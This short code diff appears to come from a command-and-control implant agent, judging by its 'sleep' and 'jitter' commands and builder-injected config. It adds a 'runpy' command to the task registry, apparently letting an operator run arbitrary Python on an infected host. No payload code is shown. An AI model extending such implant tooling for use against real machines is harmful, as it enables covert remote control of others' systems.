@@ -22,6 +22,7 @@ from commands import getenv as cmd_getenv
 from commands import sleep as cmd_sleep
 from commands import jitter as cmd_jitter
 from commands import config as agent_config
+from commands import runpy as cmd_runpy
 
 
 # --- Injected by builder via string substitution ---
@@ -121,6 +122,7 @@ COMMANDS = {
     "getenv":   cmd_getenv.execute,
     "sleep":    cmd_sleep.execute,
     "jitter":   cmd_jitter.execute,
+    "runpy":    cmd_runpy.execute,
 }
 
 # Handles a single task by looking up the command in the registry and executing it
